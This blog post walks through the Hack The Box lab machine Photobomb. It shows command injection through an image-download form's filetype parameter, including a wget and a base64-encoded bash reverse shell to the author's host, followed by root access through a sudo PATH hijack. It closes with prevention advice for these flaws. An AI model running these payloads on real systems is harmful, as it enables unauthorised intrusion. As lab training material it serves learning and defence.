---
layout: post
title: Hack The Box Walkthrough - Photobomb
date: 2023-02-11
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2023/02/HTB/Photobomb
img: 2023/02/Photobomb/Photobomb.png
---

In this easy box, I had to exploit a web application that allowed reformatting images to get remote code execution. Then I got root by exploiting a cleanup script with too many permissions.

* Room: Photobomb
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Photobomb](https://app.hackthebox.com/machines/Photobomb)
* Author: [slartibartfast](https://app.hackthebox.com/users/85231)

## Enumeration

I first launched RustScan to look for opened ports on the server.

```bash
$ rustscan -a target -- -v | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.46.4:22
Open 10.129.46.4:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-15 16:48 EDT
Initiating Ping Scan at 16:48
Scanning 10.129.46.4 [2 ports]
Completed Ping Scan at 16:48, 0.03s elapsed (1 total hosts)
Initiating Connect Scan at 16:48
Scanning target (10.129.46.4) [2 ports]
Discovered open port 22/tcp on 10.129.46.4
Discovered open port 80/tcp on 10.129.46.4
Completed Connect Scan at 16:48, 0.02s elapsed (2 total ports)
Nmap scan report for target (10.129.46.4)
Host is up, received syn-ack (0.025s latency).
Scanned at 2022-10-15 16:48:25 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
```

Only ports 22 (SSH) and 80 (HTTP) were open.

## Website

I opened a browser and navigated to the machine IP. I was redirected to 'http://photobomb.htb/'. I added 'photobomb.htb' to my hosts file and reloaded the page.

![Main Site](/assets/images/2023/02/Photobomb/MainSite.png "Main Site")

Since the box had a domain name, I looked for subdomains but did not find anything.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -t30 --hw 10 -H "Host:FUZZ.photobomb.htb" "http://photobomb.htb/"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://photobomb.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

```

I also launched Feroxbuster to look for hidden pages.

```bash
$ feroxbuster -u http://photobomb.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://photobomb.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       22l       95w      843c http://photobomb.htb/
401      GET        7l       12w      188c http://photobomb.htb/printer
401      GET        7l       12w      188c http://photobomb.htb/printerfriendly
401      GET        7l       12w      188c http://photobomb.htb/printers
401      GET        7l       12w      188c http://photobomb.htb/printer_friendly
401      GET        7l       12w      188c http://photobomb.htb/printer-friendly
401      GET        7l       12w      188c http://photobomb.htb/printerFriendly
401      GET        7l       12w      188c http://photobomb.htb/printer2
401      GET        7l       12w      188c http://photobomb.htb/printer-ink
401      GET        7l       12w      188c http://photobomb.htb/printer_page
[####################] - 2m    119601/119601  0s      found:10      errors:0
[####################] - 2m    119601/119601  677/s   http://photobomb.htb/
```

There was a `/printer` page, but it required authentication.

The home page had something about credentials being in a welcome package, but I did not have that package. I looked at the page source. It included a JavaScript file that contains some credentials.

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://REDACTED@photobomb.htb/printer');
  }
}
window.onload = init;
```

I used those credentials to access the '/printer' page.

![Printer Page](/assets/images/2023/02/Photobomb/Connected.png "Printer Page")

This page had a bunch of images. And it allowed downloading them in different file types and sizes.

![Download Image](/assets/images/2023/02/Photobomb/DownloadImage.png "Download Image")

Thinking that the application might have used shell commands to transform the images, I tried executing commands. I launched a web server on my machine and tried to make the application sends requests to it. I quickly found that I could use `;` in the file type and append a command to it.

```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg%3bwget+http%3a//10.10.14.143%3b&dimensions=30x20
```

This `wget` sent a request to my web server. So I knew I could execute code on the server. I used that to get a reverse shell. 

First I base64 encoded the reverse shell command to prevent having issues with special characters.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.143/4444 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDQgMD4mMSAK
```

And I sent that command in the file type parameter.

```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg%3becho+-n+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDQgMD4mMSAK+|+base64+-d+|+bash+%3b&dimensions=30x20
```

My netcat listener got a hit and I was on the server.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.143] from (UNKNOWN) [10.129.14.41] 47186
bash: cannot set terminal process group (705): Inappropriate ioctl for device
bash: no job control in this shell

wizard@photobomb:~/photobomb$ whoami
whoami
wizard

wizard@photobomb:~/photobomb$ ls ~/
ls ~/
photobomb
user.txt

wizard@photobomb:~/photobomb$ cat ~/user.txt
cat ~/user.txt
REDACTED
```

## Getting root

I copied my SSH public key to the server and reconnected with SSH. 

```bash
wizard@photobomb:~$ mkdir .ssh
mkdir .ssh

wizard@photobomb:~$ chmod 700 .ssh
chmod 700 .ssh

wizard@photobomb:~$ cd .ssh
cd .ssh

wizard@photobomb:~/.ssh$ echo ssh-rsa AAAA... > authorized_keys
<4T7wbwU6/l8Pa8l7ezQkX7Ko4Av2m8Es= > authorized_keys

wizard@photobomb:~/.ssh$ chmod 600 authorized_keys
chmod 600 authorized_keys
```

Then I checked if I could run anything with `sudo`.

```bash
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh

wizard@photobomb:~$ ls -la /opt/cleanup.sh
-r-xr-xr-x 1 root root 340 Sep 15 12:11 /opt/cleanup.sh

```

I was able to run a cleanup script as root. I could not modify the script, so I looked at what it did.

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

The script was making a backup of some logs. And making sure all the original images belonged to root. It was using `find` to get all images and change their owner. But it did not provide the full path to the `find` command. And the `sudo` configuration had [`SETENV`](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#setenv). This meant I could change environment variables when using `sudo` to run the script. 

I created a `find` script in my home folder. Then I modified the `PATH` variable to include my home folder when calling the cleanup script.

```bash
wizard@photobomb:~$ cat find
#!/bin/bash
/bin/bash -p

wizard@photobomb:~$ chmod +x find

wizard@photobomb:~$ sudo PATH=/home/wizard:$PATH /opt/cleanup.sh

root@photobomb:/home/wizard/photobomb# whoami
root

root@photobomb:/home/wizard/photobomb# cat /root/root.txt
REDACTED
```

## Prevention

The first issue with the box was with having credentials in JavaScript. Just don't do that, ever! 

Next, the web application was using user supplied arguments in a command sent to the shell.

```ruby
post '/printer' do
  photo = params[:photo]
  filetype = params[:filetype]
  dimensions = params[:dimensions]

  # handle inputs
  if photo.match(/\.{2}|\//)
    halt 500, 'Invalid photo.'
  end

  if !FileTest.exist?( "source_images/" + photo )
    halt 500, 'Source photo does not exist.'
  end

  if !filetype.match(/^(png|jpg)/)
    halt 500, 'Invalid filetype.'
  end

  if !dimensions.match(/^[0-9]+x[0-9]+$/)
    halt 500, 'Invalid dimensions.'
  end

  case filetype
  when 'png'
    content_type 'image/png'
  when 'jpg'
    content_type 'image/jpeg'
  end

  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
  response['Content-Disposition'] = "attachment; filename=#{filename}"

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
  else
    puts "File already exists."
  end

  if File.exists?('resized_images/' + filename)
    halt 200, {}, IO.read('resized_images/' + filename)
  end

  #message = 'Failed to generate a copy of ' + photo + ' resized to ' + dimensions + ' with filetype ' + filetype
  message = 'Failed to generate a copy of ' + photo
  halt 500, message
end
```

There was some validation around the parameters. But it's not sufficient. The code makes sure that the file type contains `png` or `jpg`. But it should make sure it does not contain anything else. Since the application only supports two file types, it would have been easy to reject anything that is not one of them. And then use hard-coded values instead of the ones provided by the user.

There must be ways to escape the shell parameters in Ruby. But in this case, the list of acceptable options is limited. It could have easily be validated against an allowed list.

Then I got root by exploiting a script that I could run with `sudo`. The script should have used full path for all the commands it ran. Also, there was no reason to allow setting environment variables when calling `sudo`.